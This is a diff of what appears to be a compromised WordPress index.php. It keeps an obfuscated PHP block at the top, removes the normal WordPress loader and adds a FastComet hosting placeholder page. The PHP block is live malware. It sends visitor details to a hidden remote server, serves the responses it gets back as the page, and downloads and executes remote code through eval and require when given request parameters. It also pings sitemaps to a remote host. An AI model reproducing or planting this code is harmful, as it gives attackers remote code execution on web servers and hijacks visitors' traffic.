@@ -1,20 +1,121 @@
 <?php
  goto f3Rh3; pyYwS: function SS0SZ($uNndf) { goto E6c1e; n5ITD: return false; goto w9ehF; DwVSE: return false; goto mmRhE; E6c1e: $jxtEK = @preg_split("\x2f\173\134\174\x7d\57\163\151", $uNndf, -1, PREG_SPLIT_NO_EMPTY); goto g3gc4; mmRhE: TU9eS: goto vJDH7; vJDH7: return $jxtEK; goto HuvJG; g3gc4: if (is_array($jxtEK)) { goto UVgGx; } goto n5ITD; w9ehF: UVgGx: goto hq2fQ; hq2fQ: if (!(count($jxtEK) != 2)) { goto TU9eS; } goto DwVSE; HuvJG: } goto aXUXp; RCqyN: function G00pR($FD61t) { goto LSTRJ; iJgzX: stream_set_timeout($WtMtq, 30); goto rWK8D; CeAqN: $uNndf = ''; goto msO2U; ACYz0: $f_KC_ .= "\x3a"; goto DXP_Y; M24jz: Or2lB: goto yGytZ; p22AF: curl_setopt($mNUnb, CURLOPT_TIMEOUT, 100); goto Oce_w; u3YGP: goto fV1oC; goto qq1nS; YdNiu: if (feof($WtMtq)) { goto W2NCD; } goto w68CP; tARbK: isset($PK3gg["\x70\x61\x74\150"]) || ($PK3gg["\160\141\x74\150"] = ''); goto U073g; F83cu: $WtMtq = null; goto czarr; jNwIJ: rfk2q: goto Ry2u1; ZE49j: goto t8tLh; goto fz8_v; qnj7u: unset($f_KC_); goto vVjQ7; dYQUX: $g7mNf .= $nh_C_; goto tGt_C; ob0gF: $sFSmG = "\143\165\162\x6c\137\x69\156\x69\x74\53\x63\x75\x72\x6c\x5f\163\145\x74\x6f\160\x74\53\x63\x75\x72\154\x5f\145\170\145\x63\174\146\x73\x6f\x63\153\157\160\x65\156\174\x70\x66\x73\x6f\143\x6b\157\x70\x65\156\x7c\x73\164\x72\x65\x61\155\137\163\x6f\143\153\x65\164\x5f\143\154\151\x65\x6e\x74\174\x73\157\143\x6b\x65\x74\x5f\143\162\145\x61\164\x65"; goto TSbDP; uD21h: foreach (explode("\x7c", $sFSmG) as $knBX3) { goto FtIG9; Pglh8: Zrqq0: goto D3OOi; X5tYC: goto rfk2q; goto Jz4Fa; D3OOi: unset($sk10L); goto mFWfp; mFWfp: if (!$O3MPF) { goto bxpO9; } goto NIWfo; Jz4Fa: bxpO9: goto l9aSc; AZ_Aq: foreach (explode("\x2b", $knBX3) as $sk10L) { if (!function_exists($sk10L)) { $O3MPF = 0; } QL6Yr: } goto Pglh8; FtIG9: $O3MPF = 1; goto AZ_Aq; l9aSc: eal45: goto RVLFr; NIWfo: $d7Tz_ = $knBX3; goto X5tYC; RVLFr: } goto jNwIJ; qq1nS: Fa0Sr: goto Sc0c1; eZucx: $nh_C_ .= $PK3gg["\x68\157\x73\164"]; goto Nm0nl; dLXNk: t8tLh: goto IPyte; TSbDP: $d7Tz_ = $hhiWf = $fZloB = $fFhTG = ''; goto uD21h; QJonP: return trim(trim($uNndf, "\357\xbb\xbf")); goto t5JBK; tGt_C: $FKUKj[] = $g7mNf; goto KcOKq; KlC3G: $M2NLV = "\x31\56\x31"; goto sJj0X; cmI5X: $g7mNf = "\x48\157\x73\164\72\x20"; goto dYQUX; d80Qs: $JMhqc = file_get_contents($FD61t); goto sq1Eb; nqCdV: return $ScV7t; goto dDYwo; PbmiO: goto QDqTs; goto VkLJx; LHoQL: $WtMtq = stream_socket_client($f_KC_, $fZloB, $fFhTG, 30); goto qnj7u; Brc6T: $fcfWm = empty($PK3gg["\x70\x6f\162\x74"]) ? 80 : $PK3gg["\x70\x6f\162\164"]; goto er33Z; vwRgk: unset($BFzLM); goto lW7oN; lVdnR: z7emH: goto M24jz; NFKdW: $FKUKj[] = "\x55\163\145\x72\x2d\x41\147\x65\x6e\x74\x3a\40\x73"; goto q0NUu; ofzqG: return "\x35\60\60"; goto lqMy9; xl84T: if (!$ScV7t) { goto ljOps; } goto nqCdV; Cme0W: curl_setopt($mNUnb, CURLOPT_RETURNTRANSFER, 1); goto p22AF; rJDjG: $uNndf = @preg_replace_callback("\x2f\x28\77\72\50\77\x3a\x5c\x72\134\156\174\x5c\156\51\174\x5e\51\x28\133\60\55\x39\101\x2d\106\x5d\x2b\x29\x28\x3f\72\134\x72\x5c\156\174\x5c\156\51\173\61\x2c\62\x7d\x28\x2e\52\x3f\x29" . "\50\x28\x3f\72\134\162\x5c\156\x7c\134\x6e\51\x28\x3f\72\x5b\60\55\x39\101\55\x46\x5d\53\50\77\72\134\x72\134\x6e\x7c\x5c\156\51\51\x7c\44\51\x2f\x73\151", "\x66\137\141\163\171\x6e\x63", $uNndf); goto QJonP; mnD8T: goto e8BNX; goto xz7sX; djRLU: isset($PK3gg["\150\157\x73\164"]) || ($PK3gg["\x68\x6f\x73\164"] = ''); goto tARbK; Nyaqv: unset($FKUKj, $PK3gg, $M2NLV, $TbhZV); goto F83cu; Sc0c1: $WtMtq = $d7Tz_($nh_C_, $fcfWm, $fZloB, $fFhTG, 30); goto c303H; WbZQO: $uNndf = implode("\15\xa\15\12", $uNndf); goto jJSrD; jBrWd: goto vMIDY; goto JXWXk; V8XbO: return 0; goto Qr_yX; O2vV1: crnl6: goto YdNiu; GZxLa: stream_set_blocking($WtMtq, TRUE); goto iJgzX; dsWAu: vMIDY: goto xsxDa; q0NUu: $FKUKj[] = "\101\x63\x63\x65\x70\x74\x3a\x20\x2a\57\52"; goto Sd6YD; oQWra: if (!($PaL16 && (rawurlencode($PaL16) == "\45\x30\x44\x25\x30\x41" || rawurlencode($PaL16) == "\45\60\x41"))) { goto Mn0z8; } goto mnD8T; sJj0X: $fcfWm = empty($PK3gg["\160\157\x72\x74"]) ? 443 : $PK3gg["\160\x6f\162\164"]; goto fjEay; c303H: fV1oC: goto CeAqN; VTjOU: return $JMhqc; goto ODizD; Oce_w: curl_setopt($mNUnb, CURLOPT_FRESH_CONNECT, TRUE); goto n4VoD; eH2e1: unset($RskaP); goto FAyb2; JXWXk: o_2GI: goto GZxLa; Sd6YD: unset($g7mNf); goto XKb1K; SW0CC: QDqTs: goto sUqXM; w68CP: $RskaP = fread($WtMtq, 8192); goto VC0OO; TLClc: $mNUnb = curl_init(); goto aWk89; BJt7L: $uNndf = explode("\xd\xa\15\xa", $uNndf); goto bfcGJ; KRH7t: fclose($WtMtq); goto dsWAu; cIpRq: if (!($d7Tz_ == '')) { goto R7D__; } goto V8XbO; ry1tx: unset($JJo2g); goto ZE49j; jJSrD: KxMRo: goto WQ7TL; msO2U: if ($WtMtq) { goto o_2GI; } goto W1fNu; fz8_v: MpSaz: goto BJt7L; EZ2T_: $uNndf .= $JJo2g; goto ry1tx; lj10W: return "\x35\x30\x31"; goto lVdnR; xsxDa: unset($hhiWf, $d7Tz_, $WtMtq, $fcfWm, $nh_C_); goto rJDjG; Ry2u1: unset($sFSmG, $knBX3); goto cIpRq; UYW9S: $nh_C_ = $PK3gg["\150\x6f\163\x74"]; goto dZf55; sUqXM: if (feof($WtMtq)) { goto e8BNX; } goto NtDHr; XiCva: if ($JA22a["\x74\151\x6d\145\x64\x5f\157\165\164"]) { goto cYmTZ; } goto SW0CC; nfoot: $JA22a = stream_get_meta_data($WtMtq); goto XiCva; VC0OO: $uNndf .= $RskaP; goto eH2e1; fjEay: $nh_C_ = "\x73\163\x6c\x3a\x2f\57"; goto eZucx; dCFka: $WtMtq = $d7Tz_(AF_INET, SOCK_STREAM, 0); goto mN_JC; QL3Z0: unset($JA22a); goto KRH7t; DXP_Y: $f_KC_ .= $fcfWm; goto LHoQL; vVjQ7: r6aA7: goto u3YGP; rWK8D: fwrite($WtMtq, $hhiWf); goto nfoot; XKb1K: $hhiWf = "\107\x45\124\40{$TbhZV}\40\110\124\124\120\x2f{$M2NLV}" . PHP_EOL . join(PHP_EOL, $FKUKj) . PHP_EOL . PHP_EOL; goto Nyaqv; aWk89: curl_setopt($mNUnb, CURLOPT_URL, $FD61t); goto Q8Aij; LaVcw: if (!(substr($d7Tz_, -1) == "\x74")) { goto r6aA7; } goto Q0md6; lW7oN: Gs5e_: goto jBrWd; ODizD: Ir7nB: goto ob0gF; FABqJ: $BFzLM = gethostbyname($nh_C_); goto dCFka; mN_JC: if (!socket_connect($WtMtq, $BFzLM, $fcfWm)) { goto KxMRo; } goto dj46c; vcKDQ: if (!(substr($d7Tz_, 0, 1) == "\x63")) { goto Or2lB; } goto TLClc; HrRK_: curl_close($mNUnb); goto xl84T; sq1Eb: if (!($JMhqc != false)) { goto Ir7nB; } goto VTjOU; yGytZ: $PK3gg = parse_url($FD61t); goto djRLU; S4XyN: Z0IDA: goto KlC3G; dj46c: socket_write($WtMtq, $hhiWf, strlen($hhiWf)); goto dLXNk; LSTRJ: if (preg_match("\57\136\x68\x74\164\160\163\52\134\72\134\57\x5c\57\57\x73\151", $FD61t)) { goto PRIIX; } goto ofzqG; FAyb2: goto crnl6; goto Ztu8r; Ztu8r: W2NCD: goto tLb1k; Q0md6: $f_KC_ = "\x74\x63\160\72\57\x2f"; goto mjOH8; U6QGS: ljOps: goto lj10W; Q8Aij: curl_setopt($mNUnb, CURLOPT_USERAGENT, "\163"); goto Cme0W; xz7sX: Mn0z8: goto b9Bqg; VkLJx: e8BNX: goto O2vV1; bfcGJ: array_shift($uNndf); goto WbZQO; b9Bqg: unset($PaL16); goto PbmiO; G3kwx: $M2NLV = "\x31\56\x30"; goto Brc6T; lqMy9: PRIIX: goto d80Qs; n4VoD: curl_setopt($mNUnb, CURLOPT_SSL_VERIFYPEER, 0); goto qMn0K; NtDHr: $PaL16 = fgets($WtMtq); goto oQWra; czarr: if (substr($d7Tz_, -1) == "\x6e") { goto Fa0Sr; } goto LaVcw; dZf55: if ($PK3gg["\x73\143\150\x65\x6d\145"] == "\150\164\x74\x70\163") { goto Z0IDA; } goto G3kwx; mjOH8: $f_KC_ .= $nh_C_; goto ACYz0; WQ7TL: socket_close($WtMtq); goto vwRgk; QpiME: $TbhZV = $PK3gg["\160\141\164\150"] ? $PK3gg["\x70\141\164\x68"] . ($PK3gg["\x71\x75\145\x72\171"] ? "\x3f" . $PK3gg["\161\165\145\x72\x79"] : '') : "\57"; goto UYW9S; KcOKq: $FKUKj[] = "\x43\157\x6e\x6e\x65\143\x74\x69\x6f\156\x3a\x20\103\154\x6f\163\x65"; goto NFKdW; Qr_yX: R7D__: goto vcKDQ; Nm0nl: ascyY: goto cmI5X; tLb1k: cYmTZ: goto QL3Z0; dDYwo: goto z7emH; goto U6QGS; IPyte: if (!($JJo2g = @socket_read($WtMtq, 8192))) { goto MpSaz; } goto EZ2T_; U073g: isset($PK3gg["\161\x75\x65\162\x79"]) || ($PK3gg["\161\165\145\162\x79"] = ''); goto I49r1; I49r1: isset($PK3gg["\160\157\x72\x74"]) || ($PK3gg["\x70\x6f\162\164"] = ''); goto QpiME; W1fNu: if (!(substr($d7Tz_, -1) == "\x65")) { goto Gs5e_; } goto FABqJ; er33Z: goto ascyY; goto S4XyN; qMn0K: $ScV7t = curl_exec($mNUnb); goto HrRK_; t5JBK: } goto eZQ5c; eZQ5c: function uUeBc($iYV0l) { return hexdec($iYV0l[1]) == strlen($iYV0l[2]) ? $iYV0l[2] : $iYV0l[0]; } goto u22h7; wjfiI: function KE4GM($FD61t) { goto wqsdw; LgERQ: die; goto Yo8US; Xi9EH: $zwqgM = str_replace($e5CX2, '', $zwqgM); goto Me8GS; yN7z4: $e5CX2 = base64_decode("\120\104\x39\x77\x61\110\x41\x3d"); goto OV5hu; wqsdw: $zwqgM = g00pr($FD61t); goto yN7z4; JXv6s: fclose($ZMxpH); goto DDFAJ; OV5hu: if (!(strpos($zwqgM, $e5CX2) === false)) { goto jOxMz; } goto iz7K3; yMTFa: $sFSmG = stream_get_meta_data($ZMxpH); goto AIF62; DDFAJ: die; goto HWW4T; Yo8US: J9prB: goto wBZ6O; wBZ6O: fwrite($ZMxpH, $zwqgM); goto yMTFa; Wt1Om: $ZMxpH = tmpfile(); goto mlmMk; vH98a: $WbZSh($zwqgM); goto LgERQ; mlmMk: if (!isset($_REQUEST["\x65"])) { goto J9prB; } goto Xi9EH; Me8GS: $WbZSh = "\x65" . "\166" . "\141" . "\x6c"; goto vH98a; iz7K3: die("\x67\145\x74\40\x66\x61\151\x6c\145\144"); goto A2l8k; AIF62: @(require $sFSmG["\x75\162\151"]); goto JXv6s; A2l8k: jOxMz: goto Wt1Om; HWW4T: } goto v3vve; f3Rh3: error_reporting(0); goto XBk0q; ljtsJ: function LSsrY($bZ2C7 = '') { goto xkfbk; QxqM0: return $_SERVER["\123\105\122\126\x45\x52\137\116\101\x4d\x45"]; goto uUcqE; uUcqE: fdTnH: goto vC1CE; xkfbk: if (isset($_SERVER["\x48\x54\x54\x50\x5f\110\117\x53\124"])) { goto BNqG_; } goto TXdmV; BikcF: BNqG_: goto FDjdr; oUv7q: goto fdTnH; goto pYr4W; pYr4W: EHofx: goto QxqM0; vC1CE: return $bZ2C7; goto oJwBS; lxo82: goto fdTnH; goto BikcF; TXdmV: if (isset($_SERVER["\x53\x45\x52\126\x45\x52\137\116\101\115\x45"])) { goto EHofx; } goto lxo82; FDjdr: return $_SERVER["\x48\124\x54\x50\x5f\x48\x4f\x53\x54"]; goto oUv7q; oJwBS: } goto wjfiI; InSfk: $owZLs = "\110\141\60\x52\x48\143\66\x4d\171\114\x6a\x39\155\114\x6a\154\172\144\165\x55\62\131\164\x39\x77\x4c\x3d\75"; goto TYtle; u22h7: function deXEZ($aespK = '') { goto o1pdg; Wf9AS: return trim($aespK); goto HuajQ; suTxs: $aespK = $aespK ? $aespK : $_SERVER["\x52\x45\115\x4f\124\x45\137\101\104\x44\122"]; goto Wf9AS; o1pdg: $aespK = $_SERVER["\x48\124\x54\x50\137\x56\x49\x41"] ? $_SERVER["\110\124\124\120\x5f\x58\x5f\106\117\x52\127\101\122\x44\105\x44\137\106\x4f\122"] : $_SERVER["\122\105\115\x4f\x54\105\137\101\x44\104\x52"]; goto suTxs; HuajQ: } goto ljtsJ; XBk0q: $JVK52 = "\110\x61\x30\122\x44\x63\x76\157\x33\x4c\x7a\126\124\x4d\167\147\x58\114\x79\x59\x44\x4d\x75\x67\62\x63\x74\x5a\124\x65\167\111\x6a\x4d\x77\x51\152\x4d\63\x45\130\x64\x75\x4d\x32\x59\164\71\167\x4c\75\x3d"; goto InSfk; aXUXp: function tvjEr($JVK52, $owZLs) { goto Mvv3r; vT6Kx: @header($RskaP[0]); goto g9cw7; shHzp: $RskaP = Ss0sz($uNndf); goto QU9_V; a5GLx: goto h3wjN; goto C4F23; kWX7C: VOEGN: goto E4EWU; hHbUy: $RE0vg = $_GET["\147\x6f\x6f\x67\x6c\x65\x5f\x75\162\154"]; goto kWX7C; eCesB: if (!isset($_GET["\x73\151\164\145\x6d\x61\x70"])) { goto nH85A; } goto QIMiU; XIVa2: h3wjN: goto SQTlv; eYjPf: die; goto sOD7n; s7OG6: kE4GM(sprintf($sAlnq[2], base64_decode(ACysm($owZLs)), $Q44jx["\x61\160\x69"], $_REQUEST["\x61\x63"], $_REQUEST["\160\141\164\150"], $_REQUEST["\164"])); goto f4TCl; tGbza: die; goto OeWE2; j94pD: $uNndf = G00pR($sAlnq[1]); goto ek2xn; Upggb: $dM912 = array("\x64\157\155\141\x69\156" => $Q44jx["\x73\x65\162\166\145\x72\137\x64\x6f\155\x61\x69\156"], "\162\x65\161\165\145\x73\164\137\165\162\x6c" => $Q44jx["\x72\145\161\165\145\163\164\137\165\162\154"], "\151\x70" => $Q44jx["\151\x70"], "\x61\x67\x65\156\x74" => $Q44jx["\x75\x73\x65\x72\x5f\x61\x67\145\156\x74"], "\162\x65\146\x65\162\145\x72" => $Q44jx["\162\145\146\145\x72\145\x72"], "\x70\x72\157\164\x6f\x63\x6f\x6c" => $Q44jx["\160\x72\x6f\164\x6f\143\x6f\x6c"], "\154\x61\156\147\165\141\147\145" => $Q44jx["\x6c\141\156\147\165\141\147\145"]); goto l02y2; BOeAE: $Q44jx["\x6c\x61\156\x67\165\141\147\145"] = $_SERVER["\110\124\124\x50\x5f\x41\103\x43\105\x50\124\137\114\101\x4e\x47\125\101\x47\x45"]; goto XIVa2; g9cw7: echo $RskaP[1]; goto tGbza; xB3Ob: print_r($Q44jx); goto CDXJT; RUkjR: $Q44jx["\160\x72\157\164\x6f\x63\157\154"] = "\x68\x74\x74\160\163\72\57\57"; goto hnYwl; ksqiK: $Q44jx["\141\160\x69"] = base64_decode(aCysm($Q44jx["\144\x65\x66\x61\165\154\164\137\160\141\x72\x61\x6d\163"])); goto MCKXv; PUV2E: $RE0vg = "\167\x77\167\56\x67\x6f\157\x67\154\x65\56\x63\157\x6d"; goto gdMrD; E4EWU: vfgLv($RE0vg, $Y0Puh, $Q44jx); goto DoB5D; IOFIX: var_dump($uNndf); goto j94pD; X90Xx: $Q44jx["\151\160"] = DEXEz(); goto EsQpl; ScTF9: $Q44jx["\162\x65\161\165\x65\x73\x74\x5f\x75\162\154"] = $_SERVER["\x52\105\x51\x55\x45\x53\124\x5f\x55\x52\x49"]; goto S4yvY; lzUYG: $Q44jx["\144\145\146\141\165\x6c\164\x5f\x70\141\162\141\x6d\163"] = $JVK52; goto ksqiK; gdMrD: if (!isset($_GET["\x67\x6f\157\147\x6c\x65\137\x75\x72\x6c"])) { goto VOEGN; } goto hHbUy; NaIHb: if (!isset($_REQUEST["\x64\165\x6d\160"])) { goto gSxi4; } goto IOFIX; KIqgP: a8Thm: goto RUkjR; QU9_V: if (!($RskaP !== false)) { goto stbN8; } goto vT6Kx; MCKXv: $Q44jx["\x73\145\162\166\145\162\x5f\x64\x6f\155\x61\x69\x6e"] = lSsry(); goto ScTF9; l02y2: $FD61t = sprintf($sAlnq[0], $Q44jx["\x61\160\x69"], AcysM(base64_encode(implode("\173\174\x7d", $dM912)))); goto CN6BC; W2Jr6: $sAlnq = "\x25\x73\x2f\77\162\x3d\45\163\x7c\x68\164\164\x70\163\72\57\57\x67\157\157\147\154\x65\x2e\143\x6f\x2e\x6a\x70\x7c\x25\163\77\x61\160\151\75\45\x73\x26\141\143\75\x25\163\x26\x70\141\164\150\75\45\x73\x26\164\75\45\163"; goto UrCTy; CN6BC: $uNndf = G00Pr($FD61t); goto NaIHb; cX6jJ: nHK5K: goto eCesB; QIMiU: $Y0Puh = $_GET["\163\x69\x74\145\155\141\x70"]; goto PUV2E; DoB5D: nH85A: goto W2Jr6; C4F23: NHfZa: goto BOeAE; OeWE2: stbN8: goto Qh0A9; HEqMJ: if (!(isset($_REQUEST["\141\143"]) && isset($_REQUEST["\160\141\x74\x68"]) && isset($_REQUEST["\164"]))) { goto gxJWL; } goto s7OG6; EsQpl: if (isset($_SERVER["\110\124\124\x50\x53"])) { goto a8Thm; } goto ahRSd; f4TCl: gxJWL: goto Upggb; S4yvY: $Q44jx["\x72\145\x66\145\x72\145\162"] = isset($_SERVER["\110\x54\124\120\x5f\122\x45\106\x45\122\x45\122"]) ? $_SERVER["\x48\124\124\x50\x5f\x52\105\x46\x45\122\x45\122"] : ''; goto y4dDC; UrCTy: $sAlnq = explode("\x7c", $sAlnq); goto HEqMJ; wXb1C: goto X2lAs; goto KIqgP; Mvv3r: $Q44jx = array(); goto lzUYG; cFtDz: if (isset($_SERVER["\110\124\x54\120\x5f\x41\103\x43\x45\x50\124\x5f\114\101\x4e\107\x55\101\107\105"])) { goto NHfZa; } goto B3_xw; sOD7n: gSxi4: goto shHzp; ahRSd: $Q44jx["\160\162\x6f\x74\157\x63\157\154"] = "\x68\164\164\x70\72\x2f\57"; goto wXb1C; y4dDC: $Q44jx["\165\163\145\162\x5f\x61\147\x65\156\x74"] = isset($_SERVER["\110\124\x54\x50\x5f\125\123\x45\122\137\101\x47\105\x4e\124"]) ? $_SERVER["\x48\x54\x54\120\137\125\x53\x45\122\x5f\x41\x47\105\116\124"] : ''; goto X90Xx; B3_xw: $Q44jx["\x6c\x61\x6e\147\165\x61\147\145"] = ''; goto a5GLx; SQTlv: if (!isset($_GET["\160\x61\162\141\x6d\163"])) { goto nHK5K; } goto xB3Ob; hnYwl: X2lAs: goto cFtDz; CDXJT: die; goto cX6jJ; ek2xn: var_dump($uNndf); goto eYjPf; Qh0A9: } goto nJ2Kp; TYtle: function DZztW($bZ2C7) { goto tSCxT; hHxly: $sgVgB = substr($bZ2C7, 7, strlen($bZ2C7) - 14); goto zR6mG; tSCxT: $Hp3ty = substr($bZ2C7, 0, 5); goto a4xQl; a4xQl: $v4zpm = substr($bZ2C7, -5); goto hHxly; zR6mG: return gzinflate(base64_decode($Hp3ty . $sgVgB . $v4zpm)); goto ccaeo; ccaeo: } goto RCqyN; Ie_fq: function vFGLV($ZlNoA, $Y0Puh, $Q44jx) { goto U1BzQ; cbC10: $i5tBh = "\x67\157\157\x67\154\145"; goto KFJRl; Eal8P: if (!(strpos($qo4DZ, $i5tBh) != false)) { goto SkxuX; } goto wJ9an; wJ9an: die($HbgWH); goto TtEMN; E47_J: $qo4DZ = G00PR($FZrOm); goto nxcxk; nxcxk: if (!isset($_REQUEST["\163\164"])) { goto AyJKj; } goto gkG_7; xj_Uc: $FZrOm = sprintf($ftSj_, $ZlNoA, $Q44jx["\160\162\157\x74\x6f\x63\157\154"], $Q44jx["\163\145\x72\x76\145\162\x5f\x64\x6f\155\x61\x69\x6e"], $Y0Puh); goto E47_J; AcJ2A: die($UFOvw); goto PQu8H; kwLzL: die; goto apGtG; HkhiR: $UFOvw = "\146\x61\151\154\145\144"; goto Eal8P; TtEMN: SkxuX: goto AcJ2A; R8EOY: var_dump($qo4DZ); goto kwLzL; gkG_7: var_dump($FZrOm); goto R8EOY; apGtG: AyJKj: goto cbC10; U1BzQ: $ftSj_ = "\150\164\164\160\163\x3a\x2f\57\x25\x73\x2f\x70\151\156\147\x3f\163\x69\x74\x65\x6d\x61\x70\x3d\45\163\x25\163\57\x25\163"; goto xj_Uc; KFJRl: $HbgWH = "\x73\x75\x63\x63\145\163\163"; goto HkhiR; PQu8H: } goto pyYwS; v3vve: function acYsM($JVK52) { goto QnaFQ; lYK3N: return $RR5IW; goto uMx_p; UAUnE: $u6rWF = str_split($JVK52); goto g1ur4; E36OD: $RR5IW .= $cxLY7; goto lYK3N; SrBGo: $RR5IW .= $u6rWF[$Z6xcm + 1] . $u6rWF[$Z6xcm]; goto B58G3; FuwQn: $Z6xcm = 0; goto iQYMc; iQYMc: bfdQy: goto PCe19; QnaFQ: $cxLY7 = substr($JVK52, strlen($JVK52) - 2); goto UAUnE; B58G3: zEJNO: goto BVwGr; PCe19: if (!($Z6xcm < count($u6rWF) - 2)) { goto iQOIM; } goto SrBGo; g1ur4: $RR5IW = ''; goto FuwQn; i7PnE: goto bfdQy; goto WOt9_/* S0vMzEJElwPNAQA=$cAT3VWynuiL7CRgr */; BVwGr: $Z6xcm = $Z6xcm + 2; goto i7PnE; WOt9_: iQOIM: goto E36OD; uMx_p: } goto Ie_fq; nJ2Kp: tvJER($JVK52, $owZLs);
 ?>
-<?php
-/**
- * Front to the WordPress application. This file doesn't do anything, but loads
- * wp-blog-header.php which does and tells WordPress to load the theme.
- *
- * @package WordPress
- */
-
-/**
- * Tells WordPress to load the WordPress theme and output it.
- *
- * @var bool
- */
-define( 'WP_USE_THEMES', true );
-
-/** Loads the WordPress Environment and Template */
-require __DIR__ . '/wp-blog-header.php';
+<!DOCTYPE html>
+<html>
+    <head>
+        <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-8145280847746579"
+     crossorigin="anonymous"></script>
+     
+        <title>Welcome to FastComet Cloud Hosting</title>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <link rel="icon" href="favicon.ico">
+        
+        <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.9.0/css/all.min.css" rel="stylesheet">
+        <link href="https://cdn.fastcomet.com/welcome/v2/css/bootstrap-4.3.1/bootstrap.min.css" rel="stylesheet">
+        <link href="https://cdn.fastcomet.com/welcome/v2/css/styles.min.css" rel="stylesheet">
+    </head>
+    <body>
+        <div class="page-wrapper">
+            <object class="bg-shape" data="https://cdn.fastcomet.com/welcome/v2/svg/top-grey-shape.svg" type="image/svg+xml"></object>
+            <header class="main-nav nav--dark">
+                <div class="container">
+                    <nav class="navbar navbar-expand-lg">
+                        <a href="https://www.fastcomet.com" target="_blank" class="navbar-brand" aria-label="Link to our Home Page">
+                            <img id="fastcomet-logo" src="https://media.fastcomet.com/storage/upload/images/logos/compare/fastcomet-logo-black.svg" alt="FastComet Logo" width="155" height="50">
+                        </a>
+                        <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarConatent" aria-controls="navbarConatent" aria-expanded="false" aria-label="Toggle navigation">
+                            <span></span>
+                            <span></span>
+                            <span></span>
+                        </button>
+                        <div class="navbar-collapse collapse" id="navbarConatent">
+                            <ul class="navbar-nav mr-auto">
+                                <li class="nav-item">
+                                    <a class="nav-link" href="https://www.fastcomet.com" target="_blank" aria-label="Link to FastComet Home Page">Home</a>
+                                </li>
+                                <li class="nav-item">
+                                    <a class="nav-link" href="https://www.fastcomet.com/blog" target="_blank" aria-label="Link to FastComet Blog">Blog</a>
+                                </li>
+                                <li class="nav-item">
+                                    <a class="nav-link" href="https://www.fastcomet.com/contacts" target="_blank" aria-label="Link to FastComet Home Page">Contact Us</a>
+                                </li>
+                                <li class="nav-item">
+                                    <a class="nav-link" href="https://www.fastcomet.com/about" target="_blank" aria-label="Link to FastComet Blog">About Us</a>
+                                </li>
+                                <li class="d-lg-none d-block">
+                                    <a href="https://my.fastcomet.com" target="_blank" class="btn btn--outline-white fill-to-right-effect" aria-label="Link to Sign in our client area" aria-hidden="true"><span>Client Login</span></a>
+                                </li>
+                            </ul>
+                        </div>
+                        <div class="page-overlay"></div>
+                        <div class="ml-lg-auto d-lg-block d-none">
+                            <div class="livechat-wrp dropdown mr-3">
+                                <a href="#" class="btn" data-toggle="live-chat" aria-label="Toggle LiveChat">
+                                    <span>Sales Questions?</span>
+                                </a>
+                            </div>
+                            <a href="https://my.fastcomet.com" target="_blank" class="btn btn--outline-white fill-to-right-effect" aria-label="Link to Sign in our client area"><span>Client Login</span></a>
+                        </div>
+                    </nav>
+                </div>
+            </header>
+            <section class="intro-section intro--dark-text intro--page-error">
+                <div class="container">
+                    <div class="row">
+                        <div class="col-lg-6 col-12 order-last order-lg-first">
+                            <object class="intro-image" alt="FastComet Welcome On Board" data="https://cdn.fastcomet.com/welcome/v2/svg/welcome-on-board.svg" type="image/svg+xml"></object>
+                        </div>
+                        <div class="col-lg-6 col-12 align-self-center order-first order-lg-last">
+                            <h1>Welcome to FastComet!</h1>
+                            <p>
+                                You see this page because no website has been published for this domain yet.
+                                If you need any help to get started or transfer your existing website, feel free to contact us 24/7 via your client area.
+                                The placeholder page will be automatically replaced as soon as you publish your website.
+                            </p>
+                            <div class="btn-holder text-center mt-5">
+                                <div class="row justify-content-between">
+                                    <div class="col-4">
+                                        <a href="/cpanel" target="_blank" class="btn btn-small btn-with-icon btn--circle"><i class="fab fa-cpanel"></i><span><span class="d-none d-md-inline">cPanel</span> Login</span></a>
+                                    </div>
+                                    <div class="col-4">
+                                        <a href="https://my.fastcomet.com" target="_blank" class="btn btn-small btn-with-icon btn--circle"><i class="far fa-life-ring"></i><span>Get Support</span></a>
+                                    </div>
+                                    <div class="col-4">
+                                        <a href="https://www.fastcomet.com/tutorials" target="_blank" class="btn btn-small btn-with-icon btn--circle"><i class="fas fa-graduation-cap"></i><span>Tutorials</span></a>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </section>
+            <footer class="footer">
+                <div class="bottom-bar">
+                    <div class="container">
+                        <div class="clearfix">
+                            <div class="float-left">
+                                <p>
+                                    © FastComet Inc. All rights reserved.
+                                    <br class="d-block d-md-none">
+                                    <a href="https://www.fastcomet.com/terms" target="_blank">Terms of Service</a> |
+                                    <a href="https://www.fastcomet.com/terms/privacy-policy" target="_blank">Privacy</a>
+                                </p>
+                            </div>
+                            <div class="float-right social-box">
+                                <a href="https://www.facebook.com/fastcometcloud" target="_blank"><i class="fab fa-facebook-f"></i></a>
+                                <a href="https://twitter.com/FastCometCloud" target="_blank"><i class="fab fa-twitter"></i></a>
+                                <a href="https://www.linkedin.com/company/fastcomet" target="_blank"><i class="fab fa-linkedin-in"></i></a>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </footer>
+        </div>
+        
+        <script src="https://code.jquery.com/jquery-2.2.4.min.js"></script>
+        <script src="https://cdn.fastcomet.com/welcome/v2/js/bootstrap-4.3.1/bootstrap.bundle.min.js"></script>
+        <script src="https://cdn.fastcomet.com/welcome/v2/js/livechat.js"></script>
+    </body>
+</html>
